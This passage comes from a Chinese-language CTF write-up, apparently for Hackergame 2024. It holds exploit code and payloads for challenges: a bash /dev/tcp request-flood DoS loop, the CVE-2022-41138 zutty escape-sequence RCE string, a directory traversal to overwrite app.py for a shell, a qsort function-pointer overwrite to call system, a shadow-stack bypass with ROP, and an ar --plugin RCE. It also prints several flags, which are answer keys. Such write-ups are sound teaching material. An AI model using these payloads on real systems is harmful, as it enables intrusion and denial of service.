	GError *error = NULL;
	const gchar *str;

	
	pid_t pid = fork();
	if (pid == 0){
		// socket
		socket_server();
		return;
	}

    // GSocket *sock = g_socket_new(G_SOCKET_FAMILY_IPV4, G_SOCKET_TYPE_STREAM, G_SOCKET_PROTOCOL_TCP, &error);
	// g_assert_no_error(error);

	int sock_fd = socket(PF_INET, SOCK_STREAM, 0);
	struct sockaddr_in native_sock  = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = inet_addr("127.0.0.1"),
		.sin_port = htons(8000)
	};
	int native_len = sizeof(native_sock);
	connect(sock_fd, (struct sockaddr *)&native_sock, native_len);

	// g_socket_connect(sock, g_inet_socket_address_new_from_string("127.0.0.1", 8000), NULL, &error);
	// g_assert_no_error(error);

	// int sock_fd = g_file_descriptor_based_get_fd(sock);


    GUnixFDList *fd_list = g_unix_fd_list_new_from_array  (
        &sock_fd, 1
    );

    GUnixFDList *out_fd_list = g_unix_fd_list_new  ();

    // g_socket_send (sock, );
	// g_assert_no_error(error);

	g_printf("flag2...\n");
	result = g_dbus_proxy_call_with_unix_fd_list_sync(
                    proxy,
					"GetFlag2",
					g_variant_new ("(h)", 0),
					G_DBUS_CALL_FLAGS_NONE,
					-1,
                    fd_list,
                    &out_fd_list,
					NULL,
					&error);
	g_assert_no_error(error);

	g_variant_get(result, "(&s)", &str);
	g_printf("The server answered: '%s'\n", str);
	g_variant_unref(result);
	// flag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_efd7ee2235}
}
```

flag3则要求我们只能用一个`/proc/[pid]/comm`为getflag3的程序来请求dbus，但是分发的那个`getflag3`只能请求不能回显。但是很显然`comm`只包括了被执行的程序文件名而不包括绝对路径，我们只要把自己的程序名字改成`getflag3`就行了。我的做法是执行一堆`system`之后execve自己。看flag提示似乎直接用prctl系统调用就可以改名。总之这问方法挺多。

（另外shell执行`dbus-send`的时候comm似乎是dbus-send）

```c
void getflag3(GDBusProxy *proxy)
{
	GVariant *result;
	GError *error = NULL;
	const gchar *str;

	g_printf("flag3...\n");
	result = g_dbus_proxy_call_sync(proxy,
					"GetFlag3",
					g_variant_new ("()"),
					G_DBUS_CALL_FLAGS_NONE,
					-1,
					NULL,
					&error);
	g_assert_no_error(error);
	g_variant_get(result, "(&s)", &str);
	g_printf("The server answered: '%s'\n", str);
	g_variant_unref(result);
	
}

void flag3(GDBusProxy *proxy, char **environ) {
    GVariant *result;
	GError *error = NULL;
	const gchar *str;

	char * new_args[3] = {"/dev/shm/getflag3", "flag3", NULL};

	system("cp /dev/shm/executable /dev/shm/getflag3");
	system("chmod +x /dev/shm/getflag3");
	execve("/dev/shm/getflag3", new_args, environ);

	// flag{prprprprprCTL_15your_FRiEND_45cb8a68a7}
}

int main( int argc , char ** argv, char **environ)
{
    GDBusConnection * connection;
	GError *error = NULL;
	const char *version;
	GVariant *variant;
    
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if(connection == NULL) {
        return -1;
    }

    proxy = g_dbus_proxy_new_sync(connection,
				      G_DBUS_PROXY_FLAGS_NONE,
				      NULL,				/* GDBusInterfaceInfo */
				      BUS_NAME,		/* name */
				      OBJ_PATH,	/* object path */
				      INTERFACE,	/* interface */
				      NULL,				/* GCancellable */
				      &error);

    // send_a_method_call(connection,"Hello, D-Bus");
	if (argc > 1) {
		getflag3(proxy);
	} else {
    	flag3(proxy, environ);
	}

    return 0;
}
```

## ![](https://img.shields.io/badge/general-af2447) 动画分享

这个题用rust实现了一个极简的文件HTTP服务器，然后跑在一个chroot的0.12旧版zutty终端模拟器下。我们可以提交一个程序和它交互。把服务器干死（不能正常响应或者退出）可以获得flag1，flag2则需要越权读取。

首先这个服务器是基于TcpStream的，我不太了解Rust，但这个应该是单线程的，并且后面请求文件的时候会一次把整个文件读出来。所以这样没有并发能力的服务器应该非常弱CC这种DoS攻击，我们只要popen出来一堆请求疯狂去GET chroot里面最大的那个文件就行了。一个进程就能实现这种DoS

```py
for i in range(40):
    try:
        subprocess.Popen(['bash', '-c', "while true; do echo GET /usr/lib/x86_64-linux-gnu/libLLVM-11.so.1; done >/dev/tcp/localhost/8000"], stdout=subprocess.DEVNULL)
        # subprocess.Popen(['python3', __file__, 'sub', str(i)], stdout=subprocess.DEVNULL)
        # for j in range(40):
        #     connect_only()

    except BlockingIOError:
        break
    except:
        raise
```

另外我还试了搞一堆socket只connect不发信，也能达到效果，这个应该算是SYN攻击？

但是很可惜的是，也正因为这个服务端是单线程，就算有海量请求它的内存占用也不会很大，所以不会触发OOM Killer，除此外也想不到别的方式能杀死这个进程了。

为什么我这么执着于杀死这个rust server，是因为我知道zutty这个版本有一个RCE的洞，即CVE-2022-41138（是这个项目唯一一个CVE），甚至gentoo上能找到poc，如果有一个程序向终端模拟器输出了下面的内容，就会触发`id`执行：

```
\x1bP$q\nid;\n\x1b\\
```

前面的`\x1bP$q`是DECRQSS (Request Status String)前缀，但是zutty判断前缀后面内容不合法时，会把这部分内容回显，也就是漏到终端模拟器跑的程序里面。假如这里面藏了换行符，那么漏下去的内容就作为shell命令执行。

那么对应到fileserver，就是每次请求的时候会把请求log到标准输出中。虽然fileserver是以`\n`分隔请求，但是我试了试zutty用`\r`也可以RCE，而这就不会被fileserver切开了。

但是这有个前提，就是终端模拟器里跑的得是个shell。如果是别的程序，那其实就是以stdin输入，比如如果里面跑的是python交互，那就得到的是python里那个id函数。如果是rust写的fileserver，则什么也不会发生，因为没有任何处理stdin输入的请求。

那么假设有办法把fileserver杀死了，那么之前stdin缓冲区的输入会全部进入shell中触发命令执行。因为退出了chroot进程，这时执行命令的就是普通的root shell，就可以随意读文件或者改权限了。

所以看看大伙怎么把这个服务器搞死。感觉要大腿拍烂了。

> 赛后：大腿真拍烂了，原来ctrl-C 在终端模拟器里就是\x03这个字符。但凡我把non printable character都遍历一边也不至于

## ![](https://img.shields.io/badge/math-90b452) 关灯
前三问直接z3一把梭了

第4题应该是要好好做了。1D关灯题应该本质上等价于一个带状矩阵的布尔线性方程组求解（异或和与分别为加法和乘法），扩展到3D可能拓展为6阶张量，或者还是一个百万大小的稀疏矩阵线性方程组求解。如果能提前求出逆的话应该可以达到它那个速度需要的要求。

## ![](https://img.shields.io/badge/web-0c4d72) 禁止内卷

这个题可以上传一个json，里面是个数组，服务端会算上传数组和目标数组的方差。我们可以上传两个文件，在某一个位置上差1，就可以通过两轮方差的差定出这个位置的内容。但是很不巧服务端会把答案里的负数取成0，所以这种方法会丢失信息。

所以这题玩的其实是目录穿越。

```py
filepath = os.path.join(UPLOAD_DIR, filename)
```
当filename可控时，且不说可以`..`接出来，如果filename以`/`开头会直接忽略`UPLOAD_DIR`把filename视为绝对路径，是不是很神奇？之后因为这个题flask还开了reload，可以直接覆盖`app.py`拿shell。

## ![](https://img.shields.io/badge/binary-c46bf9) 我们的快排確有問題

这个题是玩stdlib的qsort的，其中比较函数设计有缺陷，当两个数有一个小于2.5时，必然会返回前一个小于后一个的结论。

```c
int whos_jipiei_is_better(const void *const pa, const void *const pb) {
    const double a = *(const double *)pa;
    const double b = *(const double *)pb;

    if (!a || !b) {
        return 0;
    }
    if (a < 2.5 || b < 2.5) {
        puts("With such grades, how can we sort them?");
        return -1;
    }
    if (a < b)
        return -1;
    if (a > b)
        return 1;
    return 0;
}

```

首先手玩，加入少量小于2.5的数，会发现当输入的待排序数组长度大于128时，高概率会段错误。

qsort大致原理是把比中间某个数大和某个数小的排到两边，然后两边分别以一半的数组大小进行内部排序。因为已知右边这组所有的数必然会大于中间的数，所以qsort认为右边这组最小的数遇到了原来中间的数一定会停下来，所以没做边界检查，谁知道结果会不停。

不停的结果就是有的操作数会滑到bss段的上一个变量，也就是`gms.sort_func`，用于排序的函数指针。恰好，我们的后门函数地址转换为浮点数，也是小于2.5的。为了防止段错误，这种操作最多只能进行一次。

所以这样的数组刚好可以导致函数指针被覆盖，但是又不会报段错误。

```py
STU_NUM = 128
STU_GPA = [5 for  i in range(STU_NUM)]
STU_GPA[123] = long_to_double(real_backdoor)
```

这里后面我们用system的plt表，然后当然作为排序算法是可以传参数进去的，第一次调用的参数就是最中间那个数。我们把那里存成bss的地址，然后在输入数组里埋下一个getflag程序就行了（不知道为什么/bin/sh不行，可能是缓存区没关的过）

## ![](https://img.shields.io/badge/binary-c46bf9) 哈希三碰撞
其实算是逆向+密码学。只做了第一问，找出三个SHA256后4个字节完全相同的8字节串。生日攻击算1000000个SHA256就有大量三碰撞了。

二三问完全没思路。

> 赛后：去找区块链硬分叉。思维要活跃，这个题其实比较misc
> 然后，把反编译喂给AI生成py代码是什么神奇操作我去。思维要活跃
>
> https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%93%88%E5%B8%8C%E4%B8%89%E7%A2%B0%E6%92%9E/chat2.md

## ![](https://img.shields.io/badge/binary-c46bf9) 新生赛上的零解题

这个题有点意思，涉及了intel尚未推广的CET ROP缓解措施，影子栈SHSTK和IBT。

第一问给了一个带影子栈的C++程序，但是这个影子栈不是CPU层面，而是通过C++的异常处理机制在软件上实现的，影子栈位于一个mmap段，地址已知。并且因为是纯手工实现，甚至没有编译器支持，所以影子栈的判定位于canary判定之前。

这样第一个问题就是，即使我们破坏了canary，因为影子栈对返回地址检测更早，并且异常处理会跳过后面的代码，所以事实上会导致canary失效。另外通过对`old_rbp`和返回地址的恰当处理，我们可以让异常处理机制误以为我们在其他异常块里，并且可以导致一次栈迁移劫持程序流。具体来说：

- old_rbp: 异常结束后栈迁移所在位置。值+8是异常块结束后要返回的地址
- ret_addr: 放在哪个try块里，就决定了当前要进入哪个异常块。

所以可以第一轮直接把栈迁移到影子栈的那块mmap里，等效于知道了栈地址。第二轮栈溢出就可以直接写ROP链了，然后返回地址放在ROP的开头。ROP链构造可以用`ropper`


第二问需要配intel sde模拟环境，我一直配不太好，再加上pwntools特别卡，就先不研究了。

> 第二问绕过canary: 可以直接+跳过scanf
> 绕过影子栈：intel sde的影子栈可读可写，可以直接pwndbg搜索内存，vmmap可看偏移

## ![](https://img.shields.io/badge/AI-8b9164) 那个题目特别长的AI题

总之是某个千问1.5B大模型的输出，但是把特定字母（第一问是hackergame，第二问更多还包括些空格）都替换为x，我们需要还原原文（sha256给定）

第一问借助了他们puzzle hunt玩家特别喜欢的[nutrimatic](https://nutrimatic.org/2024/)，写了个简单查询脚本：
```py
client = requests.session()

HOST = 'https://nutrimatic.org/2024/'
alpha = '[hackergamex]'

while True:
    s = input('> ')
    if s == 'exit':
        break
    print(s.replace('x', alpha))
    resp = client.get(HOST, params={'q': s.replace('x', alpha)})
    soup = BeautifulSoup(resp.text, 'lxml')

    for ele in soup.select('span')[:10]:
        print(ele.text)
```

结合语义基本上能做出绝大多数单词，可能只有不到5个单词会有一定歧义。所以我还做了一个hash检查，把歧义单词记录下来，随机替换后计算hash，说不定就能和结果对上。我最后卡的两个词一个是`stakes are high`，一个是`race/game was on`。

- In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.
- 
- In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.

----

还有几个题做了半天没出结果，比如那个less题那个cat题那个ZFS题。准备看官方题解了。

## LESS

前半思路基本全对，就是lesspipe加扩展名。但是真的只差一个搜索，比如搜lesspipe RCE。

但是后半的扩展名程序用错了，我拿gzip试了半天，但这个最多只能造个压缩炸弹把less给OOM了，并不能造成攻击。但是看题解，用ar这个打包程序的命令，利用`ar @.a`把`.a`作为一个额外读入options的文件，然后`ar`本身可以用`--plugin`加载任意动态链接库，所以只要传一个包含`onload`函数的动态库就可以getshell。

https://seclists.org/fulldisclosure/2014/Nov/74
https://seclists.org/oss-sec/2014/q4/1027